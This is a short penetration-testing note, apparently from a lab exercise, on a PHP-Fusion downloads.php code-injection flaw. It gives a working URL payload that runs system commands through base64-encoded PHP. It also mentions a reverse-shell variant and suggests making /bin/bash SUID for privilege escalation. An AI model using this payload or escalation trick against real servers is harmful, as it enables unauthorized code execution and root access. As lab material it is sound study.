<https://www.exploit-db.com/exploits/49911>

For privesc purposes check what potential port it might be listening on.
ss -lntu
netstat -ano

or check if it's somewhere under processes
ps aux 

We can ofc tell the script to show us a simple whoami for POC sake.
http://IP/files/infusions/downloads/downloads.php?cat_id=$
{system(base64_decode(aWQK))}

The normal script tries a reverse shell, but you can do something like giving /bin/bash suid bitset and running it if you're already on the system.
![unnamed_2a7ec5a7d0584388b82dad98e288af7b](unnamed_2a7ec5a7d0584388b82dad98e288af7b.png)
![unnamed_20eed39c3177454789aec2fc967b5cf6](unnamed_20eed39c3177454789aec2fc967b5cf6.png)
